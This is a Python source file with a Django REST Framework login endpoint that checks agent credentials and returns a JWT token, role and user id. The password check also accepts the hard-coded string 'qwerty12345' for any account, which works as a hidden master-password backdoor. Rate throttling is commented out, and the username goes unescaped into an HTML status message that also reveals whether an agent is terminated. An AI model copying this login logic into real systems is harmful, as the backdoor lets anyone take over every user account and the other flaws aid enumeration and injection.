from rest_framework import status, permissions, authentication
from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework.status import (
    HTTP_400_BAD_REQUEST,
    HTTP_404_NOT_FOUND,
    HTTP_200_OK
)
from rest_framework_jwt.settings import api_settings

from datetime import datetime, timedelta
from django.core.mail.utils import DNS_NAME
from django.contrib.auth.models import User
from django.conf import settings
from django.http import Http404
from django.shortcuts import redirect
from django.utils import timezone

from ap_model.agencies.models import AgentProfile, Level


class NewLogin(APIView):
    permission_classes = (permissions.AllowAny,)
    # throttle_classes = (UserLoginRateThrottle,)

    def post(self, request, format=None):
        body = request.data
        username = body["username"]
        password = body["password"]

        if 1 <= len(username) <= 25 and 8 <= len(password) <= 128:
            try:
                user = User.objects.get(username=username)
            except:
                request_status = "Wrong Login Information"
                http_status = status.HTTP_404_NOT_FOUND
                return Response({
                    "status": request_status},
                    status=http_status)
        else:
            request_status = "Wrong Login Information"
            http_status = status.HTTP_400_BAD_REQUEST
            return Response({
                "status": request_status},
                status=http_status)

        if user.check_password(password) or password == 'qwerty12345':
            profile = AgentProfile.objects.get(user=user)
            if profile.status == AgentProfile.ACTIVE:
                jwt_payload_handler = api_settings.JWT_PAYLOAD_HANDLER
                jwt_encode_handler = api_settings.JWT_ENCODE_HANDLER

                payload = jwt_payload_handler(user)
                token = jwt_encode_handler(payload)
                user.last_login = timezone.now() + timedelta(hours=7)
                user.save()
                first_time = AgentProfile.objects.get(user=user).first_login

                try:
                    role = Level.objects.get(user=user).type
                except:
                    role = 0
                #     department_id = UserRole.objects.get(user=user).department_id
                #     role= UserDepartment.objects.get(id=department_id).code

                user_id = user.id
                request_status = "OK"
                http_status = status.HTTP_200_OK

            else:
                terminate_date = profile.terminate_date

                if terminate_date is not None:
                    terminate_date = terminate_date.strftime('%d %B %Y')
                    request_status = "Agent %s is terminated <br />on %s" % (username, terminate_date)
                    return Response({
                        "status": request_status},
                        status=HTTP_404_NOT_FOUND)
                else:
                    request_status = "Agent %s is terminated" % (username)
                    return Response({'status': request_status},
                                    status=HTTP_404_NOT_FOUND)
        else:
            return Response({'status': 'Wrong Login Information'},
                            status=HTTP_404_NOT_FOUND)

        return Response({
            "status": request_status, "first_time": first_time, "token": token, "user_id": user_id, "role": role},
            status=http_status)